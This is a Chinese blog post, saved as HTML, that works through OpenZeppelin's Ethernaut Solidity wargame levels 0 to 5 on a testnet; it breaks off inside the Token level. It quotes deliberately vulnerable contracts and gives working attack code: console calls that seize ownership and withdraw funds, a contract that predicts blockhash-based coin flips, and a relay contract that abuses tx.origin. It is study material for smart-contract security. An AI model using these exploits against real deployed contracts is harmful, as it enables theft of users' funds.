@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.0.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.0.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.0.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.0.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.0.4" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.0.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  
+  <meta name="keywords" content="Solidity,Ethereum,Blockchain," />
+
+
+<meta name="description" content="无意中看到 Openzeppelin 的这个 Solidity 题库，花了两天时间做完，稍作记录。 -1. 写在前面 Ethernaut 用的是 Ropsten 测试网，这里推荐 Dimensions.network 的水龙头，目前一次给 5 ETH，比 Metamask 的水龙头（一次 1 ETH）给的多一些。 Ethernaut 的题目 import 的 library 许多路径都过时了，可以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ethernaut 题解（0-10）">
+<meta property="og:url" content="http://yoursite.com/2020/11/15/ethernaut-workthrough-0-10/index.html">
+<meta property="og:site_name" content="Lanford33">
+<meta property="og:description" content="无意中看到 Openzeppelin 的这个 Solidity 题库，花了两天时间做完，稍作记录。 -1. 写在前面 Ethernaut 用的是 Ropsten 测试网，这里推荐 Dimensions.network 的水龙头，目前一次给 5 ETH，比 Metamask 的水龙头（一次 1 ETH）给的多一些。 Ethernaut 的题目 import 的 library 许多路径都过时了，可以">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/uploads/solidityStorageLayout.png">
+<meta property="article:published_time" content="2020-11-14T16:46:44.000Z">
+<meta property="article:modified_time" content="2020-12-01T02:00:17.592Z">
+<meta property="article:author" content="Lanford33">
+<meta property="article:tag" content="Solidity">
+<meta property="article:tag" content="Ethereum">
+<meta property="article:tag" content="Blockchain">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/uploads/solidityStorageLayout.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/11/15/ethernaut-workthrough-0-10/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+  <title>Ethernaut 题解（0-10） | Lanford33</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> <div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lanford33</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">来写点东西吧！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+  
+
+
+
+ </div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/15/ethernaut-workthrough-0-10/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lanford33">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lanford33">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Ethernaut 题解（0-10）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-15T00:46:44+08:00">2020-11-15</time>
+            
+
+            
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Coding/" itemprop="url" rel="index"><span itemprop="name">Coding</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>无意中看到 Openzeppelin 的这个 Solidity 题库，花了两天时间做完，稍作记录。</p>
+<h2 id="1-写在前面"><a href="#1-写在前面" class="headerlink" title="-1. 写在前面"></a>-1. 写在前面</h2><ol>
+<li>Ethernaut 用的是 Ropsten 测试网，这里推荐 <a href="https://faucet.dimensions.network/" target="_blank" rel="noopener">Dimensions.network 的水龙头</a>，目前一次给 5 ETH，比 <a href="https://faucet.metamask.io/" target="_blank" rel="noopener">Metamask 的水龙头</a>（一次 1 ETH）给的多一些。</li>
+<li>Ethernaut 的题目 import 的 library 许多路径都过时了，可以到<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.3.0/contracts" target="_blank" rel="noopener">这里</a>找回对应 solidity 0.5 的版本。</li>
+</ol>
+<p>补充：目前 Ethernaut 已经迁移到 Rinkeby 测试网，但是 Ropsten 测试网的版本还是可以在<a href="https://ropsten--openzeppelin-ethernaut.netlify.app/" target="_blank" rel="noopener">这里</a>访问到。</p>
+<a id="more"></a>
+
+<h2 id="0-Hello-Ethernaut"><a href="#0-Hello-Ethernaut" class="headerlink" title="0. Hello Ethernaut"></a>0. Hello Ethernaut</h2><p>就题目本身而言，这关就是用来帮助玩家熟悉环境的，略过。</p>
+<h2 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1. Fallback"></a>1. Fallback</h2><h3 id="通关条件"><a href="#通关条件" class="headerlink" title="通关条件"></a>通关条件</h3><ol>
+<li>获得目标合约的 ownership</li>
+<li>将目标合约的 balance 减少至 0</li>
+</ol>
+<h3 id="目标合约"><a href="#目标合约" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            <span class="string">"caller is not the owner"</span></span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">contribute</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &lt; <span class="number">0.001</span> ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getContribution</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    owner.transfer(address(<span class="keyword">this</span>).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> <span class="title">external</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span> &amp;&amp; contributions[msg.sender] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>可以看到，合约在 fallback 函数中有修改 owner 的逻辑，只要我们的 contribution 大于 0 且发送给合约的 ETH 大于 0，就可以成为 owner。而成为 owner 之后，就可以直接调用 withdraw 提取走合约里的所有资金。所以我们要做的操作是：</p>
+<ol>
+<li>调用 contribute，使得 contribution 大于 0</li>
+<li>向合约发送任意金额，成为 owner</li>
+<li>调用 withdraw，取走资金</li>
+</ol>
+<p>代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract.contribute(&#123;<span class="attr">value</span>: toWei(<span class="string">'0.0009'</span>, <span class="string">'ether'</span>)&#125;)</span><br><span class="line">contract.sendTransaction(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">value</span>: toWei(<span class="string">'0.001'</span>, <span class="string">'ether'</span>)&#125;)</span><br><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure>
+
+<p>至此达成条件，提交即可。</p>
+<h2 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2. Fallout"></a>2. Fallout</h2><h3 id="通关条件-1"><a href="#通关条件-1" class="headerlink" title="通关条件"></a>通关条件</h3><p>获得目标合约 ownership</p>
+<h3 id="目标合约-1"><a href="#目标合约-1" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* constructor */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fal1out</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        <span class="built_in">require</span>(</span><br><span class="line">	            msg.sender == owner,</span><br><span class="line">	            <span class="string">"caller is not the owner"</span></span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocate</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sendAllocation</span>(<span class="params">address payable allocator</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">collectAllocations</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    msg.sender.transfer(address(<span class="keyword">this</span>).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocatorBalance</span>(<span class="params">address allocator</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>仔细看代码会发现，构造函数存在 typo（应该是 <code>Fallout</code> 而不是 <code>Fal1out</code> )。我们直接调用 Fal1out 就可以修改 owner。</p>
+<p>代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.Fal1out()</span><br></pre></td></tr></table></figure>
+
+<p>补充：现在已经不能用合约同名函数作为构造函数了，也就是<strong>这个</strong> Bug 不会再发生。但是<strong>这种</strong>因为 typo 导致严重问题的情况还是可能发生，值得注意。</p>
+<h2 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3. Coin Flip"></a>3. Coin Flip</h2><h3 id="通关条件-2"><a href="#通关条件-2" class="headerlink" title="通关条件"></a>通关条件</h3><p>目标合约是个竞猜合约，连续猜中 10 次即可通关。</p>
+<h3 id="目标合约-2"><a href="#目标合约-2" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>() public &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">flip</span>(<span class="params">bool _guess</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number.sub(<span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><p>合约中的 <code>block.number</code> 是竞猜交易所在区块的块高。目标合约使用包含竞猜交易的区块的前一个块的哈希和某个因子相除得到开奖结果，这意味着在开奖前我们就能得到结果。</p>
+<p>假设竞猜交易会被打包进区块 n 中，开奖结果就是 <code>blockhash(n-1 号区块).div(FACTOR) == 1</code> 。<br>即便如此，Ropsten 出块并不是很稳定，经常短时间连续出好几个块，所以手工操作很难达成条件（试了下手工操作，最多连续两次猜中），所以我们需要写一个攻击合约来帮忙。代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract HackCoinFlip &#123;</span><br><span class="line">    using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">    CoinFlip game;</span><br><span class="line">    uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(CoinFlip _addr) public &#123;</span><br><span class="line">        game = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number.sub(<span class="number">1</span>)));</span><br><span class="line">        bool isCoinFlip = blockValue.div(FACTOR) == <span class="number">1</span>;</span><br><span class="line">        game.flip(isCoinFlip);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>目标合约限定了一个块只能竞猜一次，所以同步执行 10 次 <code>HackCoinFlip.hack()</code> 即可。</p>
+<h2 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4. Telephone"></a>4. Telephone</h2><h3 id="通关条件-3"><a href="#通关条件-3" class="headerlink" title="通关条件"></a>通关条件</h3><p>获得目标合约的 ownership</p>
+<h3 id="目标合约-3"><a href="#目标合约-3" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h3><p>需要<a href="https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin" target="_blank" rel="noopener">正确区分 tx.origin 和 msg.sender</a>。</p>
+<p>tx.origin 是交易的来源，也就是交易的最初发送者。msg.sender 是消息的直接发送者。考虑这样的调用链： A -&gt; B -&gt; C -&gt; D，D 的 msg.sender 是 C，其 tx.origin 为 A。</p>
+<p>tx.origin 永远不会是合约，而 msg.sender 可能是合约。</p>
+<p>在实际使用中，应该避免使用 tx.origin（1. 之后<a href="https://ethereum.stackexchange.com/a/200" target="_blank" rel="noopener">很可能被废弃</a>；2. 使用不注意容易引发安全问题）</p>
+<p>回到题目中来，只要 tx.origin 不等于 msg.sender，我们就可以调用 <code>changeOwner</code> 替换 owner，所以写一个简单的中间合约就好：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract HackTelephone &#123;</span><br><span class="line"></span><br><span class="line">    Telephone phone;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(Telephone _addr) public &#123;</span><br><span class="line">        phone = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        phone.changeOwner(_owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用 <code>HackTelephone.changeOwner(player)</code> 即可。</p>
+<h2 id="5-Token"><a href="#5-Token" class="headerlink" title="5. Token"></a>5. Token</h2><h3 id="通关条件-4"><a href="#通关条件-4" class="headerlink" title="通关条件"></a>通关条件</h3><p>目标合约是一个代币合约，我们已经获得了 20 个这种代币，题目要求我们想办法获得更多（最好是天量）的代币。</p>
+<h3 id="目标合约-4"><a href="#目标合约-4" class="headerlink" title="目标合约"></a>目标合约</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span 